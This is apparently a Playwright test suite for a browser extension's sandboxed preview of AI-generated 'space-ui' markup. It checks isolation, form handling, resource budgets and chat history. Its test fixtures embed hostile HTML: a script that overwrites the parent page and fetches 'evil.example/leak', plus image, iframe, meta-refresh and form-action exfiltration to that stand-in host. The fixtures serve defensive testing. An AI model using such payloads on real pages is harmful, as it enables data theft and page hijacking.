import { test, expect, chromium } from '@playwright/test';
import { createServer } from 'node:http';
import { mkdtemp, rm, readFile } from 'node:fs/promises';
import { join, resolve } from 'node:path';
import { tmpdir } from 'node:os';

test('AI UI complete stream, isolated interaction, malicious markup and history', async () => {
  test.setTimeout(120000);
  const {version} = JSON.parse(await readFile('extensions/space-browsa/upstream.json','utf8'));
  const source = resolve(`.data/packages/space-browsa-${version}`);
  const id = JSON.parse(await readFile('extensions/space-browsa/identity.json','utf8')).extensionId;
  const html = '<h2>Local task planner</h2><output id="count">0</output><button data-ui-action="increment" data-ui-target="count">Add task</button><form><input name="querySelector" disabled hidden><label>Task<input name="task"></label><button data-ui-action="increment" data-ui-target="count">In form increment</button><button data-ui-action="toggle" data-ui-target="notes">Toggle notes</button><p id="notes">Optional notes</p><button type="submit">Save locally</button><input type="submit" value="Input submit"><output></output></form><button onclick="parent.postMessage({type:\'SPACE_NETWORK\'},\'*\')">Unsafe handler</button><script>parent.document.body.textContent="HACKED";fetch("https://evil.example/leak");</script><img src="https://evil.example/leak"><a href="https://evil.example/leak">outbound</a><iframe src="https://evil.example/leak"></iframe><meta http-equiv="refresh" content="0;url=https://evil.example/leak">';
  const raw = 'Here is a local planner.\n```space-ui\n'+html+'\n```';
  let release: (()=>void)|undefined; let requests = 0;
  const server = createServer(async(req,res)=> {
    for await (const _ of req) { /* fake provider, no secrets */ }
    res.writeHead(200,{'Content-Type':'text/event-stream'});
    const delta = (content:string)=>res.write('data: '+JSON.stringify({choices:[{delta:{content}}]})+'\n\n');
    const requestNumber = ++requests;
    if (requestNumber >= 3) {
      delta(requestNumber === 3 ? raw + '\nExplanation cut by output limit.' : '\nContinuation also cut.');
      res.write('data: '+JSON.stringify({choices:[{delta:{},finish_reason:'length'}]})+'\n\n');
      res.end('data: [DONE]\n\n'); return;
    }
    delta(requestNumber === 2 ? raw : raw.slice(0,-4));
    await new Promise<void>(r=>{release=r;});
    if (requestNumber !== 2) delta(raw.slice(-4)); res.end('data: [DONE]\n\n');
  });
  await new Promise<void>(r=>server.listen(8797,'127.0.0.1',r));
  const root = await mkdtemp(join(tmpdir(),'space-ai-ui-'));
  const context = await chromium.launchPersistentContext(join(root,'profile'),{
    channel:'chromium',headless:true,executablePath:process.env.CHROMIUM_PATH,
    args:[`--disable-extensions-except=${source}`,`--load-extension=${source}`],
  });
  try {
    const settings = await context.newPage(); await settings.goto(`chrome-extension://${id}/options.html`);
    await settings.evaluate(()=> (window as any).chrome.storage.local.set({ providers:{test:{type:'llm',alias:'Fixture',baseUrl:'http://localhost:8797/v1',apiKey:'fixture-only',model:'fixture',models:['fixture'],apiStyle:'chat',stream:true}},activeProvider:'test',llmsTxtEnabled:false,deepExtractEnabled:false }));
    const page = await context.newPage(); await page.goto('https://example.com');
    const panel = await context.newPage(); await panel.goto(`chrome-extension://${id}/sidepanel.html`);
    await panel.locator('#input').fill('Return a local task planner as space-ui');
    await panel.getByRole('button',{name:'AI UI',exact:true}).click();
    await expect(panel.locator('#input')).toHaveValue(/Return a local task planner as space-ui[\s\S]*space-ui Markdown/);
    expect(requests).toBe(0);
    await panel.locator('#send').click();
    await expect.poll(()=>!!release).toBe(true);
    await expect(panel.locator('.space-ai-ui iframe')).toHaveCount(0);
    release!();
    await expect(panel.getByRole('button',{name:'关闭预览（重置交互）'})).toBeVisible();
    const external:string[]=[]; context.on('request',req=>{if(req.url().includes('evil.example'))external.push(req.url());});
    const ui = panel.frameLocator('.space-ai-ui iframe');
    const click=async(name:string)=>{const button=ui.getByRole('button',{name,exact:true});await button.scrollIntoViewIfNeeded();await button.evaluate(()=>new Promise<void>(r=>requestAnimationFrame(()=>requestAnimationFrame(()=>r()))));await button.click();};
    await expect(ui.getByRole('heading',{name:'Local task planner'})).toBeVisible();
    await ui.locator('#ui-count').evaluate(() => new Promise<void>(r=>requestAnimationFrame(()=>requestAnimationFrame(()=>r())))); await click('Add task'); await expect(ui.locator('#ui-count')).toHaveText('1');
    await click('In form increment');
    await expect(ui.locator('#ui-count')).toHaveText('2');
    await expect(ui.locator('form output')).toHaveText('');
    await click('Toggle notes'); await expect(ui.locator('#ui-notes')).toBeHidden();
    await click('Toggle notes'); await expect(ui.locator('#ui-notes')).toBeVisible();
    await ui.getByRole('button',{name:'In form increment'}).press('Enter'); await expect(ui.locator('#ui-count')).toHaveText('3');
    await ui.locator('input[name=task]').fill('Read book'); await click('Save locally');
    await expect(ui.locator('form output')).toHaveText('task: Read book');
    await ui.locator('input[name=task]').fill('Input submit works');
    await click('Input submit');
    await expect(ui.locator('form output')).toHaveText('task: Input submit works');
    await ui.locator('input[name=task]').fill('Enter works'); await ui.locator('input[name=task]').press('Enter');
    await expect(ui.locator('form output')).toHaveText('task: Enter works');
    await expect(ui.locator('script:not([src]),img,a,iframe,meta[http-equiv]')).toHaveCount(0);
    await expect(ui.locator('[onclick]')).toHaveCount(0);
    await click('Unsafe handler');
    expect(external).toEqual([]);
    const frame = panel.frames().find(f=>f.url().includes('sandbox.html'))!;
    expect(await frame.evaluate(()=>{try { return !!parent.document; } catch { return false; }})).toBe(false);
    expect(await frame.evaluate(()=> !!(globalThis as any).chrome?.runtime?.id)).toBe(false);
    expect(await frame.evaluate(async()=> {try {await fetch('https://evil.example/csp'); return false;} catch {return true;}})).toBe(true);
    expect(await frame.evaluate(()=>window.open('https://evil.example/popup') === null)).toBe(true);
    await panel.evaluate(()=>window.postMessage({type:'SPACE_UI_READY',extra:'forged'},'*'));
    await expect(ui.locator('#ui-count')).toHaveText('3');
    await panel.screenshot({path:'test-results/ai-ui-preview.png',fullPage:true});
    await panel.setViewportSize({width:420,height:820});
    await panel.screenshot({path:'test-results/ai-ui-narrow.png'});
    await panel.setViewportSize({width:1440,height:1000});
    await panel.getByRole('button',{name:'关闭预览（重置交互）'}).click();
    await panel.getByRole('button',{name:'打开交互预览'}).click(); await expect(ui.locator('#ui-count')).toHaveText('0');
    await panel.reload(); await expect(ui.locator('#ui-count')).toHaveText('0');
    expect(external).toEqual([]);
    // Even a closed fence received before DONE must not preview after cancellation.
    release = undefined;
    await panel.locator('#input').fill('Cancel this UI'); await panel.locator('#send').click();
    await expect.poll(()=>!!release).toBe(true);
    await expect(panel.getByRole('button',{name:'打开交互预览'})).toHaveCount(0); // original preview currently open
    await panel.locator('#input').press('Escape');
    await expect.poll(async()=>panel.evaluate(async()=>{
      const {history}=await (window as any).chrome.storage.local.get('history');
      return history?.some((m:any)=>m.interrupted);
    })).toBe(true);
    release!();
    await panel.reload(); await expect(panel.getByRole('button',{name:'关闭预览（重置交互）'})).toHaveCount(1);
    // A closed UI block plus truncated trailing explanation stays blocked after reload.
    await panel.locator('#input').fill('Return a truncated UI'); await panel.locator('#send').click();
    await expect.poll(async()=>panel.evaluate(async()=>{
      const {history}=await (window as any).chrome.storage.local.get('history');
      const tail=history?.at(-1);return tail?.role === 'assistant' && tail.outputTruncated === true;
    })).toBe(true);
    expect(requests).toBe(4); // initial truncation + bounded automatic continuation
    await expect(panel.getByRole('button',{name:'关闭预览（重置交互）'})).toHaveCount(1);
    await panel.reload(); await expect(panel.getByRole('button',{name:'关闭预览（重置交互）'})).toHaveCount(1);
    // Distinct history bubbles stay independent, interrupted/truncated entries never preview.
    await panel.evaluate(async({raw})=>{
      await (window as any).chrome.storage.local.set({history:[
        {role:'assistant',content:raw},
        {role:'assistant',content:'Plain response remains readable.'},
        {role:'assistant',content:raw.replace('Local task planner','Second UI')},
        {role:'assistant',content:raw,interrupted:true},
        {role:'assistant',content:raw,outputTruncated:true},
      ]});
    },{raw});
    await panel.reload();
    await expect(panel.getByRole('button',{name:'关闭预览（重置交互）'})).toHaveCount(2);
    await expect(panel.getByText('Plain response remains readable.',{exact:true})).toBeVisible();
    await expect(panel.frameLocator('.space-ai-ui iframe').nth(1).getByRole('heading',{name:'Second UI'})).toBeVisible();
  } finally {release?.(); await context.close(); server.closeAllConnections();await new Promise<void>(r=>server.close(()=>r()));await rm(root,{recursive:true,force:true});}
});


test('model-authored calculator, reactive graph, recurrence, budgets and generation isolation',async()=>{
  test.setTimeout(120000);
  const {version}=JSON.parse(await readFile('extensions/space-browsa/upstream.json','utf8'));
  const source=resolve(`.data/packages/space-browsa-${version}`);
  const id=JSON.parse(await readFile('extensions/space-browsa/identity.json','utf8')).extensionId;
  const program={version:1,state:{n:1},views:[
    {id:'answer',text:['+', ['num',{input:'a'}], ['*',['num',{input:'b'}],4]]},
    {id:'curve',plot:['map',['range',20],'x',['array',{var:'x'},['*',['sin',['/',{var:'x'},3]],['num',{input:'gain'}]]]]},
    {id:'population',text:{state:'n'}}],events:[
      {id:'bad',event:'click',do:[{op:'repeat',count:256,var:'i',do:[{op:'repeat',count:256,var:'j',do:[{op:'set',key:'n',value:['+',{state:'n'},1]}]}]}]}
    ],tick:[{op:'set',key:'n',value:['*',{state:'n'},['num',{input:'rate'}]]}]};
  const html='<h2>Generated lab</h2><input id="a" value="2"><input id="b" value="3"><output id="answer"></output><input id="gain" type="range" min="1" max="5" value="2"><canvas id="curve"></canvas><input id="rate" type="number" value="2"><output id="population"></output><button id="bad" type="button">Budget attack</button><script type="application/space-ui+json">'+JSON.stringify(program)+'</script>';
  let calls=0;const server=createServer(async(req,res)=>{for await(const _ of req){}calls++;res.writeHead(200,{'Content-Type':'text/event-stream'});res.end('data: '+JSON.stringify({choices:[{delta:{content:'```space-ui\n'+(calls===2 ? html.replace('Generated lab','Revised lab').replace('\"n\":1','\"n\":7') : calls===3 ? html.replace('\"version\":1','\"version\":99') : html)+'\n```'}}]})+'\n\ndata: [DONE]\n\n');});
  await new Promise<void>(r=>server.listen(8798,'127.0.0.1',r));const root=await mkdtemp(join(tmpdir(),'space-program-'));
  const context=await chromium.launchPersistentContext(join(root,'profile'),{channel:'chromium',headless:true,executablePath:process.env.CHROMIUM_PATH,args:[`--disable-extensions-except=${source}`,`--load-extension=${source}`]});
  try {
    const panel=await context.newPage();await panel.goto(`chrome-extension://${id}/sidepanel.html`);
    await panel.evaluate(()=>(window as any).chrome.storage.local.set({providers:{test:{type:'llm',alias:'Fixture',baseUrl:'http://localhost:8798/v1',apiKey:'fixture-only',model:'fixture',models:['fixture'],apiStyle:'chat',stream:true}},activeProvider:'test',llmsTxtEnabled:false,deepExtractEnabled:false}));
    await panel.reload();await panel.locator('#input').fill('Generate a custom lab');await panel.locator('#send').click();
    const ui=panel.frameLocator('.space-ai-ui iframe');
    await expect(ui.locator('#ui-answer')).toHaveText('14');await ui.locator('#ui-b').fill('5');await expect(ui.locator('#ui-answer')).toHaveText('22');
    const frame=panel.frames().find(f=>f.url().includes('sandbox.html'))!;
    const chartBefore=await ui.locator('canvas').evaluate((c:any)=>c.toDataURL());
    await ui.locator('#ui-gain').fill('5');const chartAfter=await ui.locator('canvas').evaluate((c:any)=>c.toDataURL());expect(chartAfter).not.toBe(chartBefore);
    await ui.getByRole('button',{name:'单步',exact:true}).click();await expect(ui.locator('#ui-population')).toHaveText('2');
    await ui.locator('#ui-rate').fill('3');await ui.getByRole('button',{name:'单步',exact:true}).click();await expect(ui.locator('#ui-population')).toHaveText('6');
    await ui.getByRole('button',{name:'运行模拟',exact:true}).click();await expect.poll(async()=>Number(await ui.locator('#ui-population').textContent())).toBeGreaterThan(6);
    await ui.getByRole('button',{name:'停止',exact:true}).click();const stopped=await ui.locator('#ui-population').textContent();
    await panel.waitForTimeout(250);await expect(ui.locator('#ui-population')).toHaveText(stopped!);
    await ui.getByRole('button',{name:'重置',exact:true}).click();await expect(ui.locator('#ui-population')).toHaveText('1');
    await ui.getByRole('button',{name:'Budget attack'}).click();await expect(ui.locator('#notice')).toContainText('运行错误');await expect(ui.locator('#ui-population')).toHaveText('1');
    await ui.getByRole('button',{name:'重置',exact:true}).click();await expect(ui.locator('#notice')).not.toContainText('运行错误');
    expect(calls).toBe(1);await expect(panel.locator('#input')).toHaveValue('');
    await panel.getByRole('button',{name:'将显示结果放入草稿'}).click();await expect(panel.locator('#input')).toHaveValue(/answer: 22/);expect(calls).toBe(1);
    const oldInstance=await frame.evaluate('instance');
    await panel.getByRole('button',{name:'重置预览',exact:true}).click();await expect(ui.locator('#ui-answer')).toHaveText('14');await expect(ui.locator('#ui-population')).toHaveText('1');
    const next=panel.frames().find(f=>f.url().includes('sandbox.html'))!;
    await next.evaluate(old=>parent.postMessage({type:'SPACE_UI_RESULT',version:2,instance:old,request:'00000000-0000-0000-0000-000000000000',text:'STALE'},'*'),oldInstance);
    await expect(panel.locator('#input')).not.toHaveValue(/STALE/);
    await panel.reload();await expect(ui.locator('#ui-population')).toHaveText('1');
    await panel.screenshot({path:'test-results/ai-ui-program.png',fullPage:true});
    // Conversation revisions go through the SAME provider pipeline and retain the last usable bubble.
    await panel.locator('#input').fill('Revise initial population to seven');await panel.locator('#send').click();
    await expect(panel.getByRole('button',{name:'关闭预览（重置交互）'})).toHaveCount(2);
    const latest=panel.frameLocator('.space-ai-ui iframe').nth(1);
    await expect(latest.getByRole('heading',{name:'Revised lab'})).toBeVisible();await expect(latest.locator('#ui-population')).toHaveText('7');
    await expect(panel.frameLocator('.space-ai-ui iframe').nth(0).locator('#ui-population')).toHaveText('1');
    await panel.locator('#input').fill('Return an invalid program revision');await panel.locator('#send').click();
    await expect(panel.frameLocator('.space-ai-ui iframe').nth(2).locator('#ui')).toContainText('Unsupported program version');
    await expect(latest.locator('#ui-population')).toHaveText('7');expect(calls).toBe(3);
    // Browser HTML/source ceilings and state rollback are also exercised by malformed input.
    await latest.locator('#ui-a').fill('');await expect(latest.locator('#notice')).toContainText('运行错误');
    await latest.locator('#ui-a').fill('3');await expect(latest.locator('#ui-answer')).toHaveText('15');

  } finally {await context.close();server.closeAllConnections();await new Promise<void>(r=>server.close(()=>r()));await rm(root,{recursive:true,force:true});}
});


test('program forms submit once for button, input and Enter without navigation',async()=>{
  test.setTimeout(60000);
  const {version}=JSON.parse(await readFile('extensions/space-browsa/upstream.json','utf8'));
  const source=resolve(`.data/packages/space-browsa-${version}`);
  const id=JSON.parse(await readFile('extensions/space-browsa/identity.json','utf8')).extensionId;
  const program={version:1,state:{submits:0,clicks:0},views:[{id:'submits',text:{state:'submits'}},{id:'clicks',text:{state:'clicks'}}],events:[
    {id:'f',event:'submit',do:[{op:'set',key:'submits',value:['+',{state:'submits'},1]}]},
    {id:'submitButton',event:'click',do:[{op:'set',key:'clicks',value:['+',{state:'clicks'},1]}]},
    {id:'plainButton',event:'click',do:[{op:'set',key:'clicks',value:['+',{state:'clicks'},1]}]}
  ]};
  const html='<form id="f" action="https://evil.example/exfil"><input name="querySelector" hidden disabled><input name="requestSubmit" hidden disabled><input name="closest" hidden disabled><input name="getAttribute" hidden disabled><input name="dispatchEvent" hidden disabled><input id="entry" name="secret" value="local only"><button id="submitButton" type="submit"><span>Button submit</span></button><input type="submit" value="Input submit"><button id="plainButton" type="button">Plain click</button><button id="defaultSubmit">Default submit</button><output id="submits"></output><output id="clicks"></output></form><script type="application/space-ui+json">'+JSON.stringify(program)+'</script>';
  const root=await mkdtemp(join(tmpdir(),'space-program-form-'));
  const context=await chromium.launchPersistentContext(join(root,'profile'),{channel:'chromium',headless:true,executablePath:process.env.CHROMIUM_PATH,args:[`--disable-extensions-except=${source}`,`--load-extension=${source}`]});
  try {
    const panel=await context.newPage();await panel.goto(`chrome-extension://${id}/sidepanel.html`);
    await panel.evaluate(raw=>(window as any).chrome.storage.local.set({history:[{role:'assistant',content:raw}]}),'```space-ui\n'+html+'\n```');
    await panel.reload();
    const ui=panel.frameLocator('.space-ai-ui iframe');
    await expect(ui.locator('#ui-submits')).toHaveText('0');
    // Wait for layout; force skips Playwright's clobberable ancestor ARIA access, not browser events.
    await ui.locator('#ui-submits').evaluate(()=>new Promise<void>(r=>requestAnimationFrame(()=>requestAnimationFrame(()=>r()))));
    const frame=panel.frames().find(f=>f.url().includes('sandbox.html'))!;
    const url=frame.url(),requests:string[]=[];context.on('request',r=>requests.push(r.url()));
    await ui.locator('#ui-submitButton').click({force:true});
    await expect(ui.locator('#ui-submits')).toHaveText('1');await expect(ui.locator('#ui-clicks')).toHaveText('1');
    await ui.locator('input[type=submit]').click({force:true});await expect(ui.locator('#ui-submits')).toHaveText('2');await expect(ui.locator('#ui-clicks')).toHaveText('1');
    await ui.locator('#ui-entry').press('Enter');await expect(ui.locator('#ui-submits')).toHaveText('3');await expect(ui.locator('#ui-clicks')).toHaveText('2');
    await ui.locator('#ui-plainButton').click({force:true});await expect(ui.locator('#ui-submits')).toHaveText('3');await expect(ui.locator('#ui-clicks')).toHaveText('3');
    expect(frame.url()).toBe(url);expect(requests).toEqual([]);await expect(panel.locator('#input')).toHaveValue('');
    await ui.locator('#ui-defaultSubmit').click({force:true});await expect(ui.locator('#ui-submits')).toHaveText('4');await expect(ui.locator('#ui-clicks')).toHaveText('3');
    // Explicit submit events also stay local and dispatch exactly once; native navigation stays disabled.
    await ui.locator('form').evaluate(form=>EventTarget.prototype.dispatchEvent.call(form,new SubmitEvent('submit',{bubbles:true,cancelable:true})));
    await expect(ui.locator('#ui-submits')).toHaveText('5');await expect(ui.locator('#ui-clicks')).toHaveText('3');
    expect(frame.url()).toBe(url);expect(requests).toEqual([]);
  } finally {await context.close();await rm(root,{recursive:true,force:true});}
});
